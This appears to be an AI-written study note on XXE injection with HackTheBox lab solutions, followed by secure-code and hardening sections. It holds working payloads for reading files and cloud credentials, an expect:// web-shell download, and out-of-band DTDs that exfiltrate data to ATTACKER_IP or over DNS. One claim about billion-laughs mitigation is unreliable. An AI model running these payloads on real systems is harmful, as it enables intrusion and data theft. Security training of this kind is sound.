Here is the ultimate, comprehensive, and deeply detailed Obsidian-ready note. I have expanded on every single concept, fixed missing payload nuances (like the critical Parameter Entity execution steps and exact syntax to avoid parsing errors), and used Obsidian callouts (`> [!info]`, `> [!warning]`) to make it highly readable and visually structured. 

You can copy and paste this directly into your Obsidian vault.

***

# XML External Entity (XXE) Injection

> [!danger] 💀 Server-Side Attack
> Exploiting weakly configured XML parsers to access local files, execute code, perform SSRF attacks, and exfiltrate data out-of-band (OOB).

## Overview

XML External Entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. XXE attacks occur when XML input containing a reference to an external entity is processed by a weakly configured XML parser that has **external entity resolution enabled**.

**XXE Attack Capabilities:**
- **Local File Disclosure:** Read sensitive server files (e.g., `/etc/passwd`, `web.config`).
- **Remote Code Execution (RCE):** Execute system commands (via `expect://` or writing web shells).
- **Server-Side Request Forgery (SSRF):** Access internal networks and internal-only endpoints.
- **Denial of Service (DoS):** Crash the server using "Billion Laughs" entity expansion bombs.
- **Source Code Disclosure:** Extract application source code to find further vulnerabilities.

---

## 1. Local File Disclosure

### Identifying XXE Vulnerabilities

#### XML Input Detection
> [!info] Common XXE Targets
> - Contact forms or feedback forms submitting XML data.
> - API endpoints explicitly accepting `application/xml` or `text/xml`.
> - File upload functionality processing XML-based formats (SVG, DOCX, XLSX, PDF metadata).
> - SOAP web services and XML-RPC endpoints.
> - RSS feeds and XML sitemaps.

#### Testing Methodology

**Step 1: Identify XML Processing**
First, confirm the endpoint processes XML. Change the `Content-Type` header and send a basic XML structure.
```http
POST /submitDetails.php HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<root>
    <name>Test User</name>
    <email>test@example.com</email>
    <message>Test message</message>
</root>
```
> [!warning] Critical Syntax Rule
> The name in the `<!DOCTYPE name [...]>` declaration **MUST exactly match** the root element of your XML document (e.g., `<!DOCTYPE root>` for `<root>`). A mismatch will cause a parser error and fail the attack.

**Step 2: Test Entity Processing (Proof of Concept)**
Define a simple internal entity and reference it to see if the parser resolves it.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY company "Inlane Freight">
]>
<root>
    <name>Test User</name>
    <email>&company;</email>
    <message>Test message</message>
</root>
```
**Vulnerability Indicators:**
- ✅ **Vulnerable:** The response displays "Inlane Freight" in the email field.
- ❌ **Not Vulnerable:** The response displays the literal string `&company;`.
- ⚠️ **Parser Leak:** An XML parsing error reveals the parser type/version (e.g., `libxml`, `DOMDocument`).

### Basic File Disclosure Attacks

#### Reading System Files
Target `/etc/passwd` using the `file://` URI scheme.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
    <name>Test User</name>
    <email>&file;</email>
    <message>Test message</message>
</root>
```

#### Common Target Files Cheat Sheet
```bash
# Linux Sensitive Files
/etc/passwd                   # User accounts
/etc/shadow                   # Password hashes (if readable by web user)
/etc/hosts                    # Network configuration / internal hostnames
/root/.ssh/id_rsa             # SSH private keys
/var/log/apache2/access.log   # Web server logs

# Windows Sensitive Files  
C:\Windows\System32\drivers\etc\hosts
C:\Users\Administrator\.ssh\id_rsa
C:\inetpub\logs\LogFiles\W3SVC1\

# Application Configuration Files
/var/www/html/config.php            # Database credentials
/opt/tomcat/conf/tomcat-users.xml   # Tomcat admin users
C:\xampp\htdocs\config\db.php       # XAMPP DB config
```

### Reading Source Code (The PHP Filter Trick)

> [!warning] The Problem with Direct Inclusion
> If you try to read a PHP file directly (`file:///var/www/html/index.php`), the file contains characters like `<`, `>`, and `?`. The XML parser will interpret these as broken XML tags, abort the parsing, and return nothing or an error.

**The Solution: PHP Stream Wrapper**
Use PHP's built-in `php://filter` to **Base64 encode** the file *before* the XML parser reads it. This converts all dangerous special characters into safe, URL-friendly alphanumeric characters.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY source SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root>
    <name>Test User</name>
    <email>&source;</email>
    <message>Test message</message>
</root>
```

**Decoding the Output:**
```bash
# Extract the base64 string from the HTTP response and decode it
echo "PD9waHAKZWNobyAiSGVsbG8gV29ybGQhIjsKPz4=" | base64 -d

# Output: <?php echo "Hello World!"; ?>
```

### Remote Code Execution (RCE)

#### PHP Expect Wrapper (Rare but Powerful)
> [!info] Requirements
> The PHP `expect` module must be explicitly installed and enabled on the target server (rare in modern defaults, but common in custom/older setups).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY cmd SYSTEM "expect://id">
]>
<root>
    <name>Test User</name>
    <email>&cmd;</email>
    <message>Test message</message>
</root>
```

#### Web Shell Deployment via Expect
If `expect` is available, you can force the server to download a web shell.
```bash
# Step 1: Create web shell on your machine
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php

# Step 2: Start HTTP server
python3 -m http.server 80
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY shell SYSTEM "expect://curl$IFS-O$IFS'http://ATTACKER_IP/shell.php'">
]>
<root>
    <name>Test User</name>
    <email>&shell;</email>
    <message>Test message</message>
</root>
```
> [!tip] The `$IFS` Trick
> XML parsers hate spaces in URIs. Replace spaces in your command with `$IFS` (Internal Field Separator, a bash whitespace alternative) to prevent the XML syntax from breaking.

### Other XXE Attack Vectors

#### Server-Side Request Forgery (SSRF)
Force the server to make requests to internal, firewalled resources.
```xml
<!DOCTYPE root [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>
    <email>&ssrf;</email>
</root>
```

#### Denial of Service (Billion Laughs Attack)
Exponential entity expansion consumes all available server memory, crashing the parser.
> [!note] Modern Mitigation
> Most modern XML parsers (like libxml2) have this specific attack vector disabled by default via `XML_PARSE_NOENT` restrictions.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
]>
<root>
    <email>&a5;</email>
</root>
```

---

## 2. Advanced File Disclosure

### Advanced Exfiltration with CDATA

#### The Problem
Files containing XML special characters (`<`, `>`, `&`, `"`, `'`) or binary data will break the XML parser when injected directly into an entity, causing the attack to fail silently or throw an error.

#### The Theory: CDATA Wrapping
Wrapping content in `<![CDATA[ ... ]]>` tells the XML parser to treat everything inside as **raw character data**, ignoring any special characters.

#### The Hurdle: Entity Concatenation Restrictions
You might think to do this:
```xml
<!-- THIS FAILS -->
<!ENTITY begin "<![CDATA[">
<!ENTITY file SYSTEM "file:///var/www/html/index.php">
<!ENTITY end "]]>">
<!ENTITY joined "&begin;&file;&end;">
```
> [!danger] XML Parser Rule
> XML parsers strictly forbid concatenating (joining) **internal entities** (like `&begin;`) with **external entities** (like `&file;`). It will throw a parsing error.

#### The Solution: Parameter Entities (`%`)
**Parameter Entities** (denoted by `%`) can *only* be used inside the DTD. Crucially, if you load the DTD from an **external source** (your attacker server), the parser treats the parameter entities as external, which **bypasses the concatenation restriction**.

#### Complete CDATA Attack Workflow

**Step 1: Create External DTD (`xxe.dtd`)**
Host this file on your attacker machine. Notice the lack of spaces and exact syntax.
```xml
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
<!ENTITY % end "]]>">
<!ENTITY % joined "%begin;%file;%end;">
```

**Step 2: Start HTTP Server**
```bash
python3 -m http.server 8000
```

**Step 3: Send the XXE Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
    <name>Test User</name>
    <email>&joined;</email>
    <message>Test message</message>
</root>
```
**Benefits:** Works with any file type, no base64 encoding required, preserves original formatting, and bypasses character restrictions.

### Error-Based XXE

#### Scenario
The application does not display XML entity values in the response, **but** it displays raw PHP/XML parsing errors when something goes wrong.

#### The Technique: Abuse the Error Message
Force the parser to throw an error, and cleverly craft the error message so that it **includes the contents of the file you want to read**.

**Step 1: Create Error-Inducing DTD (`xxe.dtd`)**
> [!warning] Syntax Precision is Critical Here
> Do NOT put a space between `%` and the entity name (e.g., `% error` will cause a `"no name"` parsing error). Use `&#x25;` (hex for `%`) if needed to prevent premature evaluation.

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///doesnotexist/%file;'>">
%eval;
%error;
```
*How it works:* It tries to load a file named `/doesnotexist/127.0.0.1 localhost...`. Because that file doesn't exist, PHP throws an "Invalid URI" or "Failed to open stream" error, and **the exact path it tried to open (containing the file contents) is printed in the error message.**

**Step 2: Trigger the Error**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
]>
<root>
    <name>Test User</name>
    <email>test@example.com</email>
</root>
```
**Result:** The HTTP response will contain: `Warning: DOMDocument::load(): I/O warning : failed to load external entity "file:///doesnotexist/127.0.0.1 localhost..."`

---

## 3. Blind Data Exfiltration

### Out-of-band (OOB) Data Exfiltration

#### Scenario: Completely Blind XXE
**Problem:** No entity output is displayed in the response, AND no error messages are shown. The server just returns a generic "200 OK".
**Solution:** Force the application to initiate an outbound HTTP request to your attacker server, carrying the stolen file contents in the URL parameters.

#### Manual OOB Technique Workflow

**Step 1: Create the Exfiltration DTD (`xxe.dtd`)**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
%oob;
```
> [!important] The Crucial `%oob;` Line
> Many tutorials miss this! Defining `%oob` is not enough. You must explicitly call `%oob;` at the end of the DTD to actually execute the definition of the `content` entity. Without this, `&content;` in the main payload will be undefined.

**Step 2: Setup the Decoding Listener Server**
Create `index.php` on your machine to catch and decode the data.
```php
<?php
if(isset($_GET['content'])){
    // error_log prints directly to your terminal stdout, bypassing the HTTP response
    error_log("\n\n[+] Exfiltrated Data:\n" . base64_decode($_GET['content']));
}
?>
```
Start the server:
```bash
php -S 0.0.0.0:8000
```

**Step 3: Send the OOB XXE Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
]>
<root>&content;</root>
```

**Step 4: Observe the Result**
Your terminal will output the decoded file contents as soon as the target server fetches the URL:
```text
[+] Exfiltrated Data:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### Alternative OOB Methods: DNS Exfiltration

> [!tip] Bypassing Egress Firewalls
> In highly secure environments, outbound HTTP/HTTPS (Ports 80/443) to unknown IPs is blocked. However, **DNS traffic (Port 53) is almost never blocked**, as the server needs it to resolve domain names.

**Technique:** Force the server to resolve a fake domain name where the subdomain is the Base64-encoded data.
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://%file;.attacker.com/'>">
%oob;
```
**Capture:** Use a tool like `tcpdump` or a specialized DNS catcher (e.g., interact.sh, DNSLog) to capture the query, extract the subdomain, and decode it.
```bash
tcpdump -i any -n port 53 | grep attacker.com
```

### Automated OOB Exfiltration: XXEinjector

Manual OOB is tedious and prone to syntax errors. `XXEinjector` automates the DTD hosting, Base64 encoding/decoding, and logging.

**Step 1: Prepare HTTP Request Template (`xxe.req`)**
Copy the raw request from Burp Suite. Use `XXEINJECT` as a placeholder marker.
```http
POST /blind/submitDetails.php HTTP/1.1
Host: target.com
Content-Type: application/xml
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

**Step 2: Execute XXEinjector**
```bash
ruby XXEinjector.rb \
    --host=ATTACKER_IP \
    --httpport=8000 \
    --file=/tmp/xxe.req \
    --path=/etc/passwd \
    --oob=http \
    --phpfilter
```
**Flags Explained:**
- `--oob=http`: Use HTTP Out-of-Band exfiltration.
- `--phpfilter`: Automatically wraps the `--path` in `php://filter/convert.base64-encode/resource=...` to prevent XML breaking.
- **Output:** The tool automatically decodes the data and saves it cleanly to `Logs/target.com/etc/passwd.log`.

---

## HTB Academy Lab Solutions

### Lab 1: Connection.php API Key Extraction
**Target:** `http://10.129.234.170`  
**Objective:** Read `connection.php` and find the `api_key` value.

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
    <name>Test</name>
    <email>&file;</email>
    <message>Test</message>
</root>
```
**Action:** Copy the Base64 string from the response and run: `echo "[BASE64_STRING]" | base64 -d`. Look for the `$api_key` variable.

### Lab 2: Advanced Flag.php Extraction (CDATA Method)
**Target:** `http://10.129.234.170/index.php`  
**Objective:** Read `/flag.php` which contains special characters that break standard XXE.

**Step 1: Host `xxe.dtd`**
```bash
echo '<!ENTITY % begin "<![CDATA["><!ENTITY % file SYSTEM "file:///flag.php"><!ENTITY % end "]]>"><!ENTITY % joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
**Step 2: Send Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```

### Lab 3: Blind OOB Data Exfiltration
**Target:** `http://10.129.234.170/blind/submitDetails.php`  
**Objective:** Read `/327a6c4304ad5938eaf0efb6cc3e53dc.php` via OOB.

**Step 1: Host `xxe.dtd`**
```bash
cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
%oob;
EOF
python3 -m http.server 8000
```
**Step 2: Host PHP Listener (`index.php`)**
```php
<?php if(isset($_GET['content'])){ error_log("\n\n" . base64_decode($_GET['content'])); } ?>
```
```bash
php -S 0.0.0.0:8000
```
**Step 3: Send Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
]>
<root>&content;</root>
```
**Action:** Check your PHP server terminal. The decoded PHP source containing the `HTB{...}` flag will be printed.

---

## Automated XXE Testing

### Quick XXE Detection Script
```bash
#!/bin/bash
# xxe-tester.sh
URL="$1"
echo "Testing XXE on: $URL"

# Test 1: Basic entity processing
echo "[*] Test 1: Basic Entity Processing"
curl -s -X POST "$URL" -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "XXE_TEST">]><root><email>&test;</email></root>' \
    | grep -i "XXE_TEST" && echo "✓ Basic XXE detected"

# Test 2: File disclosure
echo "[*] Test 2: File Disclosure"
curl -s -X POST "$URL" -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///etc/passwd">]><root><email>&file;</email></root>' \
    | grep -i "root:" && echo "✓ File disclosure XXE detected"
```

### Burp Suite Pro Tips
- **Intruder Payloads:** Fuzz the `SYSTEM` URI with common paths (`/etc/passwd`, `/var/www/html/config.php`, `php://filter/...`).
- **Content-Type Bypass:** If `application/xml` is blocked, try `text/xml`, `application/soap+xml`, or `application/xhtml+xml`.
- **JSON to XML:** If an API accepts JSON, change the `Content-Type` to `application/xml` and convert the JSON structure to XML. Many parsers will still process it, revealing an unanticipated XXE vector.

---

## Vulnerable vs. Secure Code Examples

### ❌ Vulnerable PHP (Default Behavior)
```php
<?php
$xml_data = file_get_contents('php://input');
$doc = new DOMDocument();
// DANGER: loadXML enables external entities by default in older PHP versions
$doc->loadXML($xml_data); 
$email = $doc->getElementsByTagName('email')->item(0)->nodeValue;
echo "Check your email: " . $email;
?>
```

### ✅ Secure PHP (Hardened)
```php
<?php
$xml_data = file_get_contents('php://input');
$doc = new DOMDocument();

// 1. Disable external entity loading (PHP < 8.0)
libxml_disable_entity_loader(true);

// 2. Disable resolving externals and substituting entities
$doc->resolveExternals = false;
$doc->substituteEntities = false;

// 3. Use LIBXML_NOENT carefully, or better, disable DTD loading entirely
if ($doc->loadXML($xml_data, LIBXML_NONET)) { // LIBXML_NONET prevents network access
    $email = htmlspecialchars($doc->getElementsByTagName('email')->item(0)->nodeValue, ENT_QUOTES, 'UTF-8');
    echo "Check your email: " . $email;
} else {
    echo "Invalid XML format";
}
?>
```
> [!note] PHP 8.0+ Update
> In PHP 8.0+, `libxml_disable_entity_loader()` is deprecated because libxml 2.9.0+ disables external entity loading by default. However, always explicitly set `$doc->resolveExternals = false;` for defense in depth.

---

## Prevention & Hardening Checklist

- [ ] **Disable DTDs Entirely:** The most secure approach. If you don't need DTDs, disable them completely (e.g., `http://apache.org/xml/features/disallow-doctype-decl` = `true` in Java).
- [ ] **Disable External Entities:** If DTDs are required, explicitly disable external general and parameter entities.
- [ ] **Use Less Complex Data Formats:** Migrate away from XML to JSON or Protocol Buffers where possible, as they do not support entity resolution.
- [ ] **Input Validation:** Implement strict schema validation (XSD) to ensure the XML structure matches expected patterns before parsing.
- [ ] **Update Parsers:** Ensure XML parsing libraries (like `libxml2`) are updated to the latest versions to benefit from default secure configurations (e.g., Billion Laughs protection).
- [ ] **WAF Rules:** Deploy Web Application Firewall rules to block requests containing `<!ENTITY`, `SYSTEM`, or `file://` in the body.

---

*XXE injection vulnerabilities highlight the critical importance of secure XML parser configuration, strict input validation, and the principle of least privilege in web application architecture.*